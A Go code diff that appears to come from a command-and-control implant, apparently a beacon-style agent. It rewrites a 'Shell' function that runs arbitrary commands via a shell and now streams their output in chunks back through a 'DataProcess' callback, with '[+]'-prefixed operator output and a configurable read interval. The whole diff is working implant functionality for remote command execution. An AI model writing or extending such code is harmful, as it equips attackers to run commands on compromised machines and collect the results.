@@ -9,6 +9,7 @@ import (
 	"fmt"
 	"github.com/shirou/gopsutil/process"
 	"io/ioutil"
+	"main/config"
 	"main/sysinfo"
 	"main/util"
 	"os"
@@ -17,6 +18,7 @@ import (
 	"strconv"
 	"strings"
 	"syscall"
+	"time"
 )
 
 const (
@@ -133,11 +135,36 @@ func Shell(path string, args []byte, Token uintptr) ([]byte, error) {
 	args = args[startPos+3:]
 	argsArray := []string{"-c", string(args)}
 	cmd := exec.Command(path, argsArray...)
-	out, err := cmd.CombinedOutput()
+	stdout, err := cmd.StdoutPipe()
+	cmd.Stderr = cmd.Stdout
 	if err != nil {
 		return nil, errors.New("exec failed with: " + err.Error())
 	}
-	return out, nil
+	if err = cmd.Start(); err != nil {
+		return nil, errors.New("exec failed with: " + err.Error())
+	}
+
+	var buf []byte
+	var count int
+	time.Sleep(500 * time.Millisecond)
+	buf = make([]byte, 1024*50)
+	count, err = stdout.Read(buf)
+	DataProcess(0, buf[:count])
+	for {
+		buf = make([]byte, 1024*50)
+		count, err = stdout.Read(buf)
+		if err != nil {
+			break
+		}
+		DataProcess(0, append([]byte("[+] "+string(path)+" "+string(args)+" :\n"), buf[:count]...))
+		time.Sleep(config.CommandReadTime)
+	}
+
+	if err = cmd.Wait(); err != nil {
+		return nil, errors.New("exec failed with: " + err.Error())
+	}
+
+	return []byte("success"), nil
 
 }
 
